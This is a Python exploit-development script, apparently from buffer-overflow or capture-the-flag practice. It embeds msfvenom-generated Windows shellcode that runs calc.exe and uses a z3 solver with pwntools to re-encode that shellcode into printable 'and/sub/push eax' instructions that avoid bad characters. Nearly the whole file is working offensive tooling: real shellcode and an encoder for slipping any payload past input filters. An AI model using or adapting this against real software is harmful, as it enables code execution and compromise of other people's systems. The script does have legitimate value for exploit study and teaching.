#!/usr/bin/env python

from z3 import *
from pwn import *

def solve(b):
    s = Solver()
    bad_chars = [ 0x0a, 0x0d, 0x2F, 0x3A, 0x3F, 0x40]
    x, y, z = BitVecs('x y z', 32)
    variables = [x, y, z]

    for var in variables:
        for k in range(0, 32, 8):
            s.add(Extract(k+7, k, var) > BitVecVal(0x00, 8))
            s.add(ULT(Extract(k+7, k, var),BitVecVal(0x80, 8)))
            for c in bad_chars:
                s.add(Extract(k+7, k, var) != BitVecVal(c, 8))

    s.add(x+y+z==b)

    s.check()
    s.model()
    r = []
    for i in s.model():
        r.append(s.model()[i].as_long())

    return r

# $ msfvenom -p windows/exec CMD="calc.exe" -f python -v shellcode
shellcode =  ""
shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += "\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += "\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += "\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += "\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += "\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += "\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += "\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += "\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += "\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += "\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += "\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
shellcode += "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
shellcode += "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
shellcode += "\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
shellcode += "\x63\x2e\x65\x78\x65\x00"

shellcode = shellcode[::-1]

shellcode += "\x41"*(math.ceil(len(shellcode)/4)*4-len(shellcode))

final = b""

for i in range(int(len(shellcode)/4)):
    tmp = shellcode[i*4:i*4+4]
    target = int("0x"+''.join(str(hex(ord(j)))[2:].zfill(2) for j in tmp),16)
    neg = 0xFFFFFFFF - target + 1
    res = solve(neg)
    print("and eax, 0x20202020")
    final += asm('and eax, 0x20202020')
    print("and eax, 0x02020202")
    final += asm('and eax, 0x02020202')
    for j in res:
        print("sub eax, 0x%08x" % j)
        final += asm('sub eax, 0x%02x' % j)
    final += asm("push eax")
    print("push eax\n")

print(''.join("\\x%02x" % i for i in final))



